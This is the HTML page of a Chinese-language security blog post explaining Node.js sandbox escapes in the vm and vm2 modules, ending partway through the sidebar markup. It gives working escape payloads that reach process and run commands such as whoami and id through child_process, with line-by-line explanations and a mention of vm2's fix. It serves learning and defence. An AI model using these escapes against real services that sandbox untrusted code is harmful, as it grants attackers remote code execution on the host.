@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="什么是沙箱就只针对于node.js而言，沙箱和docker容器其实是差不多的，都是将程序与程序之间，程序与主机之间互相分隔开，但是沙箱是为了隔离有害程序的，避免影响到主机环境。为什么node.js语言要引入沙箱，这就要说说js语言中的作用域（也叫上下文）。 1234567891011在JavaScript中，上下文（context）是指代码执行时的环境。每段JavaScript代码都运行在一个特定">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VM沙盒逃逸">
+<meta property="og:url" content="http://example.com/2023/06/08/VM%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是沙箱就只针对于node.js而言，沙箱和docker容器其实是差不多的，都是将程序与程序之间，程序与主机之间互相分隔开，但是沙箱是为了隔离有害程序的，避免影响到主机环境。为什么node.js语言要引入沙箱，这就要说说js语言中的作用域（也叫上下文）。 1234567891011在JavaScript中，上下文（context）是指代码执行时的环境。每段JavaScript代码都运行在一个特定">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/vm1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/vm2.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t019a0a1a14c6443ec4.png">
+<meta property="article:published_time" content="2023-06-08T03:20:15.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:48:08.222Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/vm1.png">
+
+<link rel="canonical" href="http://example.com/2023/06/08/VM%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>VM沙盒逃逸 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/08/VM%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VM沙盒逃逸
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-08 11:20:15" itemprop="dateCreated datePublished" datetime="2023-06-08T11:20:15+08:00">2023-06-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:48:08" itemprop="dateModified" datetime="2025-05-25T11:48:08+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="什么是沙箱"><a href="#什么是沙箱" class="headerlink" title="什么是沙箱"></a>什么是沙箱</h2><p>就只针对于node.js而言，沙箱和<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=docker%E5%AE%B9%E5%99%A8&spm=1001.2101.3001.7020">docker容器</a>其实是差不多的，都是将程序与程序之间，程序与主机之间互相分隔开，但是沙箱是为了隔离有害程序的，避免影响到主机环境。为什么node.js语言要引入沙箱，这就要说说js语言中的作用域（也叫上下文）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在JavaScript中，上下文（context）是指代码执行时的环境。每段JavaScript代码都运行在一个特定的上下文中，其中包含了当前代码的变量、函数、对象等信息。</span><br><span class="line"></span><br><span class="line">JavaScript中存在两种类型的上下文：全局上下文和函数上下文。</span><br><span class="line"></span><br><span class="line">全局上下文是指在代码最外层定义的变量和函数，它们可以在整个JavaScript程序中被访问。全局上下文在页面加载时就被创建，并且在整个页面的生命周期中都存在。</span><br><span class="line"></span><br><span class="line">函数上下文是指在函数执行时创建的上下文。每当函数被调用时，就会创建一个新的函数上下文，这个上下文包含了函数的参数、内部变量和函数等信息。函数执行完毕后，该函数上下文就会被销毁。</span><br><span class="line"></span><br><span class="line">在JavaScript中，上下文是按照执行顺序进行嵌套的。当代码执行到一个函数内部时，就会创建一个新的函数上下文，并将其压入上下文栈中。当函数执行完毕后，该函数上下文就会被弹出栈，JavaScript引擎会回到上一个上下文中继续执行代码。</span><br><span class="line"></span><br><span class="line">上下文在JavaScript中非常重要，它决定了当前代码可以访问哪些变量和函数。理解JavaScript上下文的工作原理对于编写高效、可靠的JavaScript代码非常重要。</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>我们来看一个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const a = require(&quot;./a&quot;)</span><br><span class="line"> </span><br><span class="line">console.log(a.age)</span><br><span class="line">//a.js:var age = 100;-------&gt;输出undefined</span><br><span class="line">//-------------------------//</span><br><span class="line">//a.js:var age = 100;exports.age = age;--------&gt;输出100</span><br></pre></td></tr></table></figure>
+
+<p>若没有exports将需要的属性暴露出来，我们是访问不到另一个包内的属性的。包与包之间是互不相通的，也就是说每一个包都有自己的作用域。我们知道JavaScript的全局变量是window。其中所有的属性都是挂载到这个window下的，当然，node也有全局变量，是global。全局变量能在包间访问，换句话说，所有的包都挂载在全局变量下。node执行rce需要引入process对象进而导入child_process模块来执行命令。然而，process是挂载到global上的。为了防止恶意代码影响主机环境，所以就引入沙箱，开辟一个新的作用域来运行不信任的代码。相较于其他作用域，它阻止我们从内部直接访问global全局变量。此后的逃逸也是在这个点做文章。</p>
+<h2 id="VM模块的作用"><a href="#VM模块的作用" class="headerlink" title="VM模块的作用"></a>VM模块的作用</h2><p>引入vm模块就是为了创建一个沙箱运行环境。先看一段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const util = require(&#x27;util&#x27;);</span><br><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">global.age = 3;</span><br><span class="line">const sandbox = &#123; age: 1 &#125;;</span><br><span class="line">vm.createContext(sandbox);</span><br><span class="line">vm.runInContext(&#x27;age *= 2;&#x27;, sandbox);</span><br><span class="line">console.log(util.inspect(sandbox));//inspect方法会递归地遍历对象的属性和值，并按照一定的格式将它们转换为字符串。</span><br><span class="line">console.log(util.inspect(age));</span><br><span class="line">//输出</span><br><span class="line">//&#123; age: 2 &#125;</span><br><span class="line">//3</span><br></pre></td></tr></table></figure>
+
+<p>vm.createContext函数，创建一个沙箱对象，在全局变量global外又创建一个作用域。此时sandbox对象就是此作用域的全局变量。vm.runInContext函数，第一个参数是沙箱内要执行的代码，第二个是沙箱对象。还有一个函数，vm.runInNewContext，是creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。根据代码输出，我们可以看出沙箱内是不能访问到global。</p>
+<h2 id="如何逃逸"><a href="#如何逃逸" class="headerlink" title="如何逃逸"></a>如何逃逸</h2><p>上文也说明了node要执行命令的前提是访问到process对象。那么逃逸的主要思路就是怎么从外面的global全局变量中拿到process。vm模块是非常不严谨的，基于node原型链继承的特性，我们很容易就能拿到外部全局变量。看一段简单的逃逸代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const a = vm.runInNewContext(`this.constructor.constructor(&#x27;return global&#x27;)()`);</span><br><span class="line">console.log(a.process);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/vm1.png" alt="img"></p>
+<p>很明显是逃逸出去了。如何做到的？这里的this是指向传递到runInNewContext函数的一个对象，他是不属于沙箱内部环境的，访问当前对象的构造器的构造器，也就是Function的构造器，由于继承关系，它的作用域是全局变量，执行代码，获取外部global。拿到process对象就可以执行命令了。</p>
+<p>再利用这个代码执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const s = require(&quot;process&quot;)</span><br><span class="line">const a = vm.runInNewContext(`this.constructor.constructor(&#x27;return process&#x27;)()`);</span><br><span class="line">console.log(a.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString());</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/vm2.png" alt="img"></p>
+<p>console.log会执行node代码，从而调用构造器函数返回process对象导致rce。vm模块的隔离作用可以说非常的差了。所以开发者在此基础上加以完善，推出了vm2模块。那么vm2模块能否逃逸。</p>
+<h2 id="VM2沙盒逃逸"><a href="#VM2沙盒逃逸" class="headerlink" title="VM2沙盒逃逸"></a>VM2沙盒逃逸</h2><p>vm2基于vm开发，使用官方的vm库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸。</p>
+<p>vm2 特性：</p>
+<ul>
+<li>运行不受信任的JS脚本</li>
+<li>沙箱的终端输出信息完全可控</li>
+<li>沙箱内可以受限地加载modules</li>
+<li>可以安全地向沙箱间传递callback</li>
+<li>死循环攻击免疫 while (true)</li>
+</ul>
+<p>vm2相比vm做了很大的改进，其中之一就是利用了es6新增的 proxy 特性，从而拦截对诸如 constructor 和 <strong>proto</strong> 这些属性的访问</p>
+<p>首先需要补充一点es6 proxy的知识 <a target="_blank" rel="noopener" href="https://es6.ruanyifeng.com/?search=weakmap&x=0&y=0#docs/proxy">https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy</a></p>
+<h3 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = `var process;</span><br><span class="line">Object.prototype.has=(t,k)=&gt;&#123;</span><br><span class="line">    process = t.constructor(&quot;return process&quot;)();</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot; in Buffer.from;</span><br><span class="line">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()`</span><br><span class="line">try&#123;</span><br><span class="line">    console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看一段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var handler = &#123;</span><br><span class="line">    get () &#123;</span><br><span class="line">     console.log(&quot;get&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  var target = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  var proxy = new Proxy(target, handler);</span><br><span class="line"></span><br><span class="line">  Object.prototype.has = function()&#123;</span><br><span class="line">    console.log(&quot;has&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  proxy.a; //触发get</span><br><span class="line">  &quot;&quot; in proxy; //触发has，这个has是在原型链上定义的</span><br></pre></td></tr></table></figure>
+
+<p>在对象 <code>target</code> 上定义了 <code>get</code> 操作，会拦截对象属性的读取，所以当访问 <code>proxy.a</code> 时，会打印出 <code>get</code></p>
+<p>但是当执行 <code>&quot;&quot; in proxy</code> 时，也会被 <code>has</code>方法拦截，此时，我们虽然没有直接在 <code>target</code> 对象上定义 <code>has</code> 拦截操作，即代理的方法是可以被继承的。</p>
+<p>回到vm2逃逸的代码，vm2中实际运行的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">var process;</span><br><span class="line"></span><br><span class="line">Object.prototype.has = function (t, k) &#123;</span><br><span class="line">    process = t.constructor(&quot;return process&quot;)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&quot;&quot; in Buffer.from;</span><br><span class="line">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br></pre></td></tr></table></figure>
+
+<p><code>Buffer.from</code> 是一个代理对象，vm2的作者一开始并没有给vm2内部的Object 加上 has方法，所以我们可以自己给 <code>Object</code> 对象的原型上添加 <code>has</code> 方法，这时候运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot; in Buffer.from;</span><br></pre></td></tr></table></figure>
+
+<p>就会去执行我们定义好的has方法，由于 <code>proxy</code> 的机制，参数 <code>t</code> 是 <code>function Buffer.from</code> ，这个function是在外部的，其上下文是 nodejs 的global下，所以访问其 <code>constructor</code> 属性就获取到了外部的 <code>Function</code>，从而拿到外部的 <code>process</code></p>
+<p>官方给的修复方法：给Buffer.form添加has方法，这样has方法就直接会调用自己的has方法，而不是去调用原型的has方法</p>
+<h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = `var process;</span><br><span class="line">try&#123;</span><br><span class="line">    Object.defineProperty(Buffer.from(&quot;&quot;), &quot;&quot;, &#123;get set()&#123;</span><br><span class="line">        Object.defineProperty(Object.prototype,&quot;get&quot;,&#123;get()&#123;</span><br><span class="line">            throw x=&gt;x.constructor(&quot;return process&quot;)();</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">        return ()=&gt;&#123;&#125;;</span><br><span class="line">    &#125;&#125;);</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">    process = e(()=&gt;&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();`;</span><br><span class="line">try&#123;</span><br><span class="line">    console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样地，需要补充一点js的知识：</p>
+<p>js的对象中，存在三种不同的属性：数据属性，访问器属性和内部属性。我们只看数据属性和访问器属性</p>
+<p>数据属性和访问器属性都存在 <code>[[Enumerable]]</code> 和 <code>[[Configurable]]</code> 特性</p>
+<p>不同点：以下特性属于数据属性：</p>
+<ul>
+<li><code>[[Value]]</code>：该属性的属性值，默认为<code>undefined</code>。</li>
+<li><code>[[Writable]]</code>：是一个布尔值，表示属性值（<code>value</code>）是否可改变（即是否可写），默认为<code>true</code>。</li>
+</ul>
+<p>以下特性属于访问器属性</p>
+<ul>
+<li><code>[[Get]]</code>：是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code></li>
+<li><code>[[Set]]</code>：是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    prop: let obj = &#123;</span><br><span class="line">    prop:123,</span><br><span class="line">    Writable: true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let jbo = &#123;</span><br><span class="line">    get prop()&#123;</span><br><span class="line">        return &quot;get&quot;;</span><br><span class="line">    &#125;,</span><br><span class="line">    set prop(val)&#123;</span><br><span class="line">        console.log(&quot;set&quot;+val);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(obj.prop); //123</span><br><span class="line">console.log(jbo.prop); //get</span><br></pre></td></tr></table></figure>
+
+<p>我们也可以通过 <code>Object.defineProperty</code> 来设置对象的访问器属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;&#125;;</span><br><span class="line">Object.defineProperty(obj, &quot;prop&quot;, &#123;</span><br><span class="line">    get()&#123;</span><br><span class="line">        return &quot;get&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(obj.prop);</span><br></pre></td></tr></table></figure>
+
+<p>我们还可以这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;&#125;;</span><br><span class="line">Object.defineProperty(obj, &quot;prop&quot;, &#123;</span><br><span class="line">    get get()&#123;</span><br><span class="line">        console.log(&quot;get1&quot;); //get1</span><br><span class="line">        return ()=&gt;&#123;return &quot;get2&quot;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(obj.prop); //get2</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，会先执行 <code>get()</code> 函数，打印 <code>get1</code>，返回一个函数，作为 <code>prop</code> 属性的 getter，之后访问 <code>obj.prop</code> 时，就会打印 <code>get2</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get()&#123;</span><br><span class="line">       console.log(&quot;get1&quot;);</span><br><span class="line">       return ()=&gt;&#123;return &quot;get2&quot;&#125;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>同理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;&#125;;</span><br><span class="line">Object.defineProperty(obj, &quot;prop&quot;, &#123;</span><br><span class="line">    get set()&#123;</span><br><span class="line">        console.log(&quot;set1&quot;);</span><br><span class="line">        return (val)=&gt;&#123;console.log(&quot;set2&quot;)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">obj.prop = 1</span><br></pre></td></tr></table></figure>
+
+<p>此时会先执行一次 <code>set()</code> 函数打印出 <code>set1</code>，同时设置 <code>prop</code> 属性的 setter 为 <code>(val)=&gt;&#123;console.log(&quot;set2&quot;)&#125;</code> 之后执行 <code>obj.prop = 1</code> 时，就会打印 <code>set2</code>;</p>
+<p>那么回过头来看vm2逃逸的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var process;</span><br><span class="line">try &#123;</span><br><span class="line">    let a = Buffer.from(&quot;&quot;)</span><br><span class="line">    Object.defineProperty(a, &quot;&quot;, &#123;</span><br><span class="line">        get set() &#123;</span><br><span class="line">            Object.defineProperty(Object.prototype, &quot;get&quot;, &#123;</span><br><span class="line">                get: function get() &#123;</span><br><span class="line">                    throw function (x) &#123;</span><br><span class="line">                        return x.constructor(&quot;return process&quot;)();</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            return ()=&gt;&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    process = e(() =&gt; &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行的过程如下：</p>
+<p><img src="https://p2.ssl.qhimg.com/t019a0a1a14c6443ec4.png" alt="img"></p>
+<p>参考前文 vm2 实现原理分析，此时得到的a是一个代理对象，当我们在a上定义新属性的时候，被代理的 <code>defineProperty</code> 拦截</p>
+<p>代码分析参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/16899212.html">https://www.cnblogs.com/zpchcbd/p/16899212.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/08/%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/"> 陕西省赛部分web复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/22/Velocity-SSTI/">Velocity SSTI </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="prev" title="redis未授权">
+      <i class="fa fa-chevron-left"></i> redis未授权
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/22/Velocity-SSTI/" rel="next" title="Velocity SSTI">
+      Velocity SSTI <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
